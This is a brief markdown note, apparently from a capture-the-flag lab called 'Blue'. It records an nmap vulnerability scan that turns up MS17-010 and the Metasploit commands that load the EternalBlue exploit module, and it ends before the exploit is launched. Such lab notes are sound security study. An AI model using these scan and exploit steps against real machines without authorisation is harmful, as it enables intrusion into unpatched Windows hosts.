# Blue

## initial  Nmap scan for vulnerabilities
command used:
`sudo nmap -A -o filename -vvv -Pn --script=vuln ipadress`
aggressive, don't ping, output to file, run vulnerabilities script
finds vulnerability ms17-010

## finding exploit on metasploit
`msfconsole` `search ms17-010`
we find promising exploit/windows/smb/ms17_010_eternalblue
`use exploit/windows/smb/ms17_010_eternalblue`
show options to see what we need to fill in, looks like just rhosts

